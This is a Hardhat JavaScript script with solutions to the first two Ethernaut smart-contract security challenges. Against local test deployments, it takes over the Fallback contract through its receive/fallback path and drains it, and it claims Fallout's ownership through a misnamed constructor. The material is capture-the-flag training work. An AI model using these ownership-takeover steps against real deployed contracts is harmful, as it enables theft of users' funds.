const hre = require("hardhat");

// Ethernaut Level 1
async function runLevel1() {
  const [, user] = await ethers.getSigners();
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();
  await fallback.deployed();

  // Level 1 Solution
  const value = ethers.utils.parseUnits("1", "gwei");
  await fallback.connect(user).contribute({value});
  await user.sendTransaction({to: fallback.address, value});
  await fallback.connect(user).withdraw();
}

// Ethernaut Level 2
async function runLevel2() {
  const [, user] = await ethers.getSigners();
  const Fallout = await hre.ethers.getContractFactory("Fallout");
  const fallout = await Fallout.deploy();
  await fallout.deployed();

  // Level 2 Solution
  const value = ethers.utils.parseUnits("1", "gwei");
  await fallout.connect(user).Fal1out({value});
}

async function main() {
  runLevel1();
  runLevel2();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
